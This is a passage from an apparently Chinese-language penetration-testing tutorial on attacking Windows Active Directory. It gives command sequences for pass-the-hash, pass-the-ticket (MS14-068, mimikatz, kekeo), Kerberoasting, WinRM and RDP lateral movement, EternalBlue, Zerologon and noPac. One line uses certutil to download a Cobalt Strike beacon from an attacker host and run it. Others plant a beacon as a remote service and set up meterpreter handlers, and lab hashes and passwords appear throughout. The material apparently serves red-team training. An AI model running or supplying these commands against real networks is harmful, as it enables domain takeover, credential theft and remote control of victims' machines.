./administrator@192.168.3.32</span><br></pre></td></tr></table></figure>\n<p>（ 3 ）CrackMapExec 密码喷射<br>\n项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1BvcmNoZXR0YS1JbmR1c3RyaWVzL0NyYWNrTWFwRXhlYw==\">https://github.com/Porchetta-Industries/CrackMapExec</span><br>\n 官方手册：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcGduLmdpdGJvb2suaW8vY3JhY2ttYXBleGVjLw==\">https://mpgn.gitbook.io/crackmapexec/</span><br>\n 部分案例：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vc2VjdG9vbC8xODQ1NzMuaHRtbA==\">https://www.freebuf.com/sectool/184573.html</span></p>\n<p>下载对应 release，建立 socks 连接，设置 socks 代理，配置规则，修改 Proxychains.conf 进行代理配置，而后通过 Proxychains 调用命令。依次对所有扫描到的用户进行 pth 攻击。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">a. 域用户HASH登录</span></span><br><span class=\"line\">proxychains python cme smb 192.168.3.21- 32 - u user.txt -H 518b98adxxx</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">b. 本地用户HASH登录</span></span><br><span class=\"line\">proxychains python cme smb 192.168.3.21- 32 - u administrator -H 518b98xxx --local-auth</span><br></pre></td></tr></table></figure>\n<h4 id=\"ptt-票据传递攻击\"><a class=\"markdownIt-Anchor\" href=\"#ptt-票据传递攻击\">#</a> PTT 票据传递攻击</h4>\n<p>PTT (pass the ticket) ：票据传递攻击，利用的票据凭证 TGT 进行渗透测试（Kerberos 认证攻击）</p>\n<p>Kerberos 相当于 web 中的 cookie 和 session，需要进行身份认证。票据自生成之后，存活时间较短，一般设置为 7 天，票据存活失效之后，此票据便无用。</p>\n<p>链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dlbnRpbGtpd2kva2VrZW8vcmVsZWFzZXM=\">https://github.com/gentilkiwi/kekeo/releases</span></p>\n<p>（ 1 ）MS14068 (webadmin 权限)<br>\n 项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FiYXRjaHkxNy9XaW5kb3dzRXhwbG9pdHMvdHJlZS9tYXN0ZXIvTVMxNC0wNjg=\">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</span></p>\n<p>MS14-068 是密钥分发中心 (KDC) 服务中的 Windows 漏洞。它允许经过 身份验证的用户在其 Kerberos 票证 (TGT) 中插入任意 PAC。该漏洞位于 kdcs vc.dll 域控制器的密钥分发中心 (KDC) 中。用户可以通过呈现具有改变的 PAC 的 Kerberos TGT 来获得票证。利用漏洞生成的用户的新身份票据尝试认证</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取SID值</span></span><br><span class=\"line\">shell whoami/user</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成票据文件</span></span><br><span class=\"line\">shell ms14-068.exe -u webadmin@god.org -s S-1-5-21-121 8902331-2157346161-1782232778-1132 -d 192.168.3.21 -p admin!@#45</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">清除票据连接</span></span><br><span class=\"line\">shell klist purge</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">内存导入票据</span></span><br><span class=\"line\">mimikatz kerberos::ptc TGT_webadmin@god.org.ccache</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看当前票据</span></span><br><span class=\"line\">shell klist</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">连接目标上线</span></span><br><span class=\"line\">shell dir \\\\OWA2010CN-GOD\\c$</span><br><span class=\"line\">shell net use \\\\OWA2010CN-GOD\\C$</span><br><span class=\"line\">copy beacon.exe \\\\OWA2010CN-GOD\\C$</span><br><span class=\"line\">sc \\\\OWA2010CN-GOD create bindshell binpath= &quot;c:\\beacon.exe&quot;</span><br><span class=\"line\">sc \\\\OWA2010CN-GOD start bindshell</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">注意：成功不成功看DC域控漏洞补丁打没打</span></span><br></pre></td></tr></table></figure>\n<p>（ 2 ）kekeo (高权限，需 NTLM)<br>\n 当前主机肯定之前与其他主机连接过，所以本地会生成了一些票据，可以<br>\n导出这些票据，然后再导入票据进行利用。该方法类似于 cookie 欺骗。但是票 据是有有效期的，当前主机在连接过域控的话，有效期内可利用。即利用获取 的 NTLM 生成新的票据尝试认证。工具比较小的话可以上传到肉鸡，如果比较 大，还是需要通过 socket 代理。</p>\n<p>通过横向到其他主机尽可能获得到比较多的 hash 值进行测试：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成票据</span></span><br><span class=\"line\">shell kekeo &quot;tgt::ask /user:Administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7&quot; &quot;exit&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">导入票据</span></span><br><span class=\"line\">shell kekeo &quot;kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot; &quot;exit&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看票据</span></span><br><span class=\"line\">shell klist</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用票据连接</span></span><br><span class=\"line\">shell dir \\\\owa2010cn-god\\c$</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">注意：成功不成功看ntlm哈希值的正确性</span></span><br></pre></td></tr></table></figure>\n<p>（ 3 ）mimikatz (高权限，需 Ticket)</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用历史遗留的票据重新认证尝试</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">导出票据</span></span><br><span class=\"line\">mimikatz sekurlsa::tickets /export</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">导入票据</span></span><br><span class=\"line\">mimikatz kerberos::ptt C:\\Users\\webadmin\\Desktop\\22d3a-2-1-40e00000-Administrator@krbtgt-god.org.kirbi</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看票据：</span></span><br><span class=\"line\">shell klist</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用票据连接：</span></span><br><span class=\"line\">shell dir \\\\owa2010cn-god\\c$</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">注意：成功不成功看当前主机有没有被目标连接过</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"ptk-密钥传递攻击\"><a class=\"markdownIt-Anchor\" href=\"#ptk-密钥传递攻击\">#</a> PTK 密钥传递攻击</h4>\n<p>PTK (pass the key)：密钥传递攻击，利用的 ekeys aes256 进行的渗透测试（NTLM 认证攻击）</p>\n<p>PTK = Pass The Key，当系统安装了 KB2871997 补丁且禁用了 NTLM 的 时候，那我们抓取到的 ntlm hash 也就失去了作用，但是可以通过 PTK 的攻击 方式获得权限。这个方式利用条件比较苛刻，算的上是比较鸡肋的，一般很难 被利用到。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mimikatz sekurlsa::ekeys</span><br><span class=\"line\">mimikatz sekurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值</span><br></pre></td></tr></table></figure>\n<h4 id=\"rdp-横向渗透\"><a class=\"markdownIt-Anchor\" href=\"#rdp-横向渗透\">#</a> RDP 横向渗透</h4>\n<p>做了提权之后，进行一波 3389 端口扫描，一般配合创建新的用户，从跳板 机创建代理节点从本地接入肉鸡，需要注意的是，如果自己登陆的用户名与对 方的用户名一致，对方用户会被迫下线，反之不会。远程桌面服务支持明文及 HASH 连接。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">探针服务</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">cs 内置端口扫描 3389</span></span><br><span class=\"line\">tasklist /svc | find &quot;TermService&quot; # 找到对应服务进程的PID</span><br><span class=\"line\">netstat -ano | find &quot;PID值&quot; # 找到进程对应的端口号</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">探针连接 CrackMapExec&amp;MSF 批扫用户名密码验证</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">连接执行</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">明文连接：</span></span><br><span class=\"line\">mstsc /console /v:192.168.3.32 /admin</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">HASH连接</span></span><br><span class=\"line\">mimikatz privilege::debug</span><br><span class=\"line\">mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a53695dc997aa02d455c &quot;/run:mstsc /restrictedadmin&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"winrm-横向渗透\"><a class=\"markdownIt-Anchor\" href=\"#winrm-横向渗透\">#</a> WinRM 横向渗透</h4>\n<p>WinRM 代表 Windows 远程管理，是一种允许管理员远程执行系统管理任务 的服务。默认情况下支持 Kerberos 和 NTLM 身份验证以及基本身份验证。需要 攻击机和受害机双方都启用的 Winrm rs 的服务。并且使用此服务需要管理员级 别凭据。</p>\n<p>Windows 2008 以上版本默认自动状态，Windows Vista/win7 上必须手动启 动；Windows 2012 之后的版本默认允许远程任意主机来管理。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">攻击机开启：</span></span><br><span class=\"line\">winrm quickconfig -q</span><br><span class=\"line\">winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">探针可用：</span></span><br><span class=\"line\">cs 内置端口扫描 5985</span><br><span class=\"line\">powershell Get-WmiObject -Class win32_service | Where-Object &#123;$_.name -like &quot;WinRM&quot;&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">连接执行：</span></span><br><span class=\"line\">winrs -r:192.168.3.32 -u:192.168.3.32\\administrator -p:admin!@#45 whoami</span><br><span class=\"line\">winrs -r:192.168.3.21 -u:192.168.3.21\\administrator -p:Admin12345 whoami</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">上线CS&amp;MSF:</span></span><br><span class=\"line\">winrs -r:192.168.3.32 -u:192.168.3.32\\administrator -p:admin!@#45 &quot;cmd.exe /c certutil -urlcache -split -f [http://192.168.3.31/beacon.exe](http://192.168.3.31/beacon.exe) beacon.exe &amp; beacon.exe&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"spn-kerberos-攻击\"><a class=\"markdownIt-Anchor\" href=\"#spn-kerberos-攻击\">#</a> SPN Kerberos 攻击</h4>\n<p>在无法通过 mimikaza 获取到 hash 或者明文的时候，可以采用通过 kerberos 获取凭证中隐藏的具体密码。通过 spn 先扫描电脑上存在的服务列表，在针对服务进行利用。</p>\n<p>（ 1 ）Kerberoasting 攻击的利用</p>\n<p>SPN 服务发现、请求服务票据、服务票据的导出、服务票据的暴力破解</p>\n<p>（ 2 ）项目地址推荐</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0dob3N0UGFjay9SdWJldXM=\">https://github.com/GhostPack/Rubeus</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25pZGVtL2tlcmJlcm9hc3Q=\">https://github.com/nidem/kerberoast</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzE3NDk2Ny5odG1s\">https://www.freebuf.com/articles/system/174967.html</span></p>\n<p>（ 3 ）如需利用需要配置策略加密方式</p>\n<p>黑客可以使用有效的域用户的身份验证票证 (TGT) 去请求运行在服务器上的一个或多个目标服务的服务票证。DC 在活动目录中查找 SPN，并使用与 S PN 关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。</p>\n<p>请求的 Kerberos 服务票证的加密类型是 RC4_HMAC_MD5，这意味着服务 帐户的 NTLM 密码哈希用于加密服务票证。黑客将收到的 TGS 票据离线进行破 解，即可得到目标服务帐号的 HASH，这个称之为 Kerberoast 攻击。</p>\n<p>如果我们有一个为域用户帐户注册的任意 SPN，那么该用户帐户的明文密 码的 NTLM 哈希值就将用于创建服务票证。</p>\n<p>（ 4 ）Kerberos 攻击条件</p>\n<p>采用 rc4 加密类型票据，工具 Rubeus 检测或看票据加密类型</p>\n<p><strong>Kerberos 攻击流程</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">spn扫描</span></span><br><span class=\"line\">powershell setspn -T 0day.org -q */*</span><br><span class=\"line\">powershell setspn -T 0day.org -q */* | findstr &quot;MSSQL&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">工具检测</span></span><br><span class=\"line\">Rubeus kerberoast</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">手工请求：（要产生票据文件）</span></span><br><span class=\"line\">powershell Add-Type -AssemblyName System.IdentityModel</span><br><span class=\"line\">powershell New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/Srv-DB-0day.0day.org:1433&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看票据</span></span><br><span class=\"line\">mimikatz kerberos:list</span><br><span class=\"line\">mimikatz kerberos::ask /target:MSSQLSvc/SqlServer.god.org:1433</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">导出</span></span><br><span class=\"line\">mimikatz kerberos::list /export</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">破解</span></span><br><span class=\"line\">python tgsrepcrack.py pass.txt &quot;1-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"exchange-攻击\"><a class=\"markdownIt-Anchor\" href=\"#exchange-攻击\">#</a> Exchange 攻击</h4>\n<ul>\n<li>Exchange 探针</li>\n</ul>\n<p>（ 1 ）端口扫描<br>\n Exchange 会对外暴露接口如 OWA,ECP 等，会暴露在 80 端口，而且 25/587/2525 等端口上会有 SMTP 服务，所以可以通过一些端口特征来定位 exchange。</p>\n<p>（ 2 ）SPN 扫描<br>\n <code>powershell setspn -T 0day.org -q */*</code></p>\n<p>（ 3 ）脚本探针版本并探测可能存在的 CVE<br>\n <code>python Exchange_GetVersion_MatchVul.py xx.xx.xx.xx</code></p>\n<ul>\n<li>Exchange 爆破</li>\n</ul>\n<p>爆破账户密码进行登录 exchange 方便钓鱼，账户密码都是通过搜索凭证中获取。</p>\n<p>Burp+Proxifier：直接将 web 流量捕获通过 burp 来爆破账户名和密码<br>\n工具链接 1：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dyYXlkZHEvRUJ1cnN0\">https://github.com/grayddq/EBurst</span><br>\n 工具链接 2：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xhemFhcnMvTWFpbFNuaXBlcg==\">https://github.com/lazaars/MailSniper</span></p>\n<ul>\n<li>Exchange 漏洞<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veGlhb3ppL3AvMTQ0ODE1OTUuaHRtbA==\"> https://www.cnblogs.com/xiaozi/p/14481595.html</span></li>\n</ul>\n<p>确定内核版本 - 筛选 Server 版本 - 确定漏洞对应关系 - 选择漏洞进行漏洞，如 CVE-2020-0688 CVE-2020-17144，主要是为了控制 exchange 服务器，一旦控制 到服务器可以大规模邮件钓鱼，寻找相应 exchange 版本存在何种漏洞，搜素利 用脚本进行利用。</p>\n<h3 id=\"域控提权\"><a class=\"markdownIt-Anchor\" href=\"#域控提权\">#</a> 域控提权</h3>\n<h4 id=\"ms17010cve-2017-0146\"><a class=\"markdownIt-Anchor\" href=\"#ms17010cve-2017-0146\">#</a> MS17010（CVE-2017-0146）</h4>\n<p>除去前述的口令传递的攻击方式之外，还可以从系统漏洞层面进行漏洞利用，如 CVE-2017-0146, 适用版本 Windows 7 8.1 10; Windows Server 2008 2 012 2016; 先如今，多数电脑已经配置上了补丁。由于 cs 只支持漏洞扫描，msf 支持漏洞利用，因此可以利用 msf 联动 cs 检测并利用。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">CS创建外联监听器</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">选择外围http的方式，并命名为msf，输入命令spawn msf，将当前主机的权限移交给msf</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">msf运行ms 17010</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">MSF监听联动配置</span></span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_http</span><br><span class=\"line\">set lhost 0.0.0.0</span><br><span class=\"line\">set lport 8888</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">添加路由</span></span><br><span class=\"line\">run autoroute -p //查看当前路由表</span><br><span class=\"line\">run post/multi/manage/autoroute //添加当前路由表</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">检测是否存在 17010 漏洞</span></span><br><span class=\"line\">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class=\"line\">set rhosts 192.168.3.21-32 //设置扫描目标段</span><br><span class=\"line\">set threads 5 //设置扫描线程数</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用模块</span></span><br><span class=\"line\">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class=\"line\">set payload windows/x64/meterpreter/bind_tcp //目标不出网用正向连接上线</span><br><span class=\"line\">set rhost 192.168.3.25 //设置连接目标</span><br><span class=\"line\">set rhosts 192.168.3.25 //设置扫描目标</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<h4 id=\"ms14-068-cve-2014-6324\"><a class=\"markdownIt-Anchor\" href=\"#ms14-068-cve-2014-6324\">#</a> MS14-068 (CVE-2014-6324)</h4>\n<p>见前面 PTT 横向移动课程演示</p>\n<h4 id=\"cve-2020-1472\"><a class=\"markdownIt-Anchor\" href=\"#cve-2020-1472\">#</a> CVE-2020-1472</h4>\n<p>适用 Windows Server 2008、2012、2016 、2019 等。需要先建立 socket 代理端口，将流量转发至公网上，并修改 hosts 文件保证域名解析正确。</p>\n<p>重置密码：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RpcmtqYW5tL0NWRS0yMDIwLTE0NzI=\">https://github.com/dirkjanm/CVE-2020-1472</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取计算机名</span></span><br><span class=\"line\">nbtscan -v -h 192.168.3.21</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">连接DC清空凭证</span></span><br><span class=\"line\">proxychains python cve- 2020 - 1472 - exploit.py OWA20N-GOD 192.168.3.21</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取域内HASH</span></span><br><span class=\"line\">proxychains python secretsdump.py OWA2010CN-GOD\\$@192.168.3.21 -just-dc -no-pass</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">连接域控PTH</span></span><br><span class=\"line\">python wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">后续恢复密码</span></span><br><span class=\"line\">https://github.com/risksense/zerologon</span><br><span class=\"line\">https://github.com/SecureAuthCorp/impacket</span><br></pre></td></tr></table></figure>\n<h4 id=\"cve-2021-42287\"><a class=\"markdownIt-Anchor\" href=\"#cve-2021-42287\">#</a> CVE-2021-42287</h4>\n<p>需要一个域内普通账号，可以影响 Windows 基本全系列。</p>\n<p>（ 1 ）参考项目地址：<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1YmUweDAvbm9QYWM=\">https://github.com/cube0x0/noPac</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL3poLWNuL3N5c2ludGVybmFscy9kb3dubG9hZHMvcHN0b29scw==\">https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools</span></p>\n<p>（ 2 ）漏洞利用流程：<br>\n代理后：修改 Host 绑定域名和 IP<br>\n 扫描探针： <code>noPac scan -domain god.org -user webadmin -pass admin!@#45</code></p>\n<p>（ 3 ）利用漏洞</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">创建一个和目标通讯的票据：</span></span><br><span class=\"line\">noPac -domain god.org -user webadmin -pass admin!@#45 /dc owa2010cn-god.god.org /mAccount dadd /mPassword sdadasdsa /service cifs /ptt</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用psexec弹出cmd窗口：</span></span><br><span class=\"line\">PsExec \\\\owa2010cn-god.god.org cmd</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">也可以利用python的以下脚本执行</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">https://github.com/WazeHell/sam-the-admin</span></span><br><span class=\"line\">python sam_the_admin.py god/&#x27;webadmin:admin!@#45&#x27; -dc-ip 192.168.3.21</span><br></pre></td></tr></table></figure>\n<h4 id=\"cve-2022-26923\"><a class=\"markdownIt-Anchor\" href=\"#cve-2022-26923\">#</a> CVE-2022-26923</h4>\n<p>当 Windows 系统的 Active Directory 证书服务 (CS) 在域上运行时，由于 机器账号中的 dNSHostName 属性不具有唯一性，域中普通用户可以将其更改为 高权限的域控机器账号属性，然后从 Active Directory 证书服务中获取域控机器 账户的证书，导致域中普通用户权限提升为域管理员权限。影响 Win8.1、Win1 0、Win11、WinServer2012R2、WinServer2016、WinServer2019、WinServer2022 等版本。</p>\n<p>（ 1 